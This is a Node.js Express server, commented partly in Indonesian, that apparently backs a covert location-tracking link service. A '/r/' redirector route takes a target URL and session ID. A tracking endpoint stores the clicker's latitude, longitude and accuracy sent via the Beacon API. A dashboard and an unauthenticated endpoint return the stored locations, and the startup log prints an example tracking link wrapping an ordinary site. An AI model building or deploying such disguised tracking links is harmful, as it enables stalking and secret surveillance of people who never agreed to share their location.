const express = require("express")
const path = require("path")
const app = express()

// Enhanced middleware configuration
app.use(
  express.raw({
    type: ["application/json", "text/plain"],
    limit: "10kb",
  }),
)

app.use(express.json())
app.use(express.static(path.join(__dirname, "public")))

const locationData = {}

// Unified tracking endpoint
app.post("/api/track", (req, res) => {
  try {
    let data

    // Handle Blob from Beacon API
    if (Buffer.isBuffer(req.body)) {
      data = JSON.parse(req.body.toString("utf8"))
    }
    // Handle regular JSON
    else if (typeof req.body === "object") {
      data = req.body
    } else {
      try {
        data = JSON.parse(req.body)
      } catch {
        return res.status(400).json({ error: "Invalid data format" })
      }
    }

    // Validate required fields
    const required = ["sessionId", "lat", "lng"]
    if (!required.every((field) => field in data)) {
      return res.status(400).json({ error: "Missing required fields" })
    }

    // Initialize session if not exists
    if (!locationData[data.sessionId]) {
      locationData[data.sessionId] = []
    }

    // Store location data
    const newLocation = {
      lat: Number.parseFloat(data.lat),
      lng: Number.parseFloat(data.lng),
      accuracy: Number.parseInt(data.accuracy || 5000),
      method: data.method || "unknown",
      timestamp: data.timestamp || Date.now(),
    }

    locationData[data.sessionId].push(newLocation)
    console.log(
      `Location tracked for session ${data.sessionId}: ${newLocation.lat}, ${newLocation.lng} (${newLocation.accuracy}m)`,
    )

    res.status(200).json({ success: true })
  } catch (error) {
    console.error("Tracking error:", error)
    res.status(500).json({ error: "Internal server error" })
  }
})

// API Endpoint untuk mendapatkan lokasi
app.get("/api/locations/:sessionId", (req, res) => {
  try {
    const { sessionId } = req.params

    if (!locationData[sessionId]) {
      return res.status(404).json({ error: "Session not found" })
    }

    res.status(200).json(locationData[sessionId])
  } catch (error) {
    console.error("Error fetching locations:", error)
    res.status(500).json({ error: "Internal server error" })
  }
})

// Route untuk halaman redirector
app.get("/r/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "redirector.html"))
})

// Route untuk dashboard utama
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "tracker.html"))
})

// Handle 404
app.use((req, res) => {
  res.status(404).send("404 - Not Found")
})

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack)
  res.status(500).send("500 - Internal Server Error")
})

// Konfigurasi server
const PORT = process.env.PORT || 3000
const HOST = "0.0.0.0"

app.listen(PORT, HOST, () => {
  console.log(`Server berjalan di http://${HOST}:${PORT}`)
  console.log(`Dashboard tersedia di http://localhost:${PORT}`)
  console.log(`Contoh link tracking: http://localhost:${PORT}/r/?u=https://example.com&s=test123`)
})
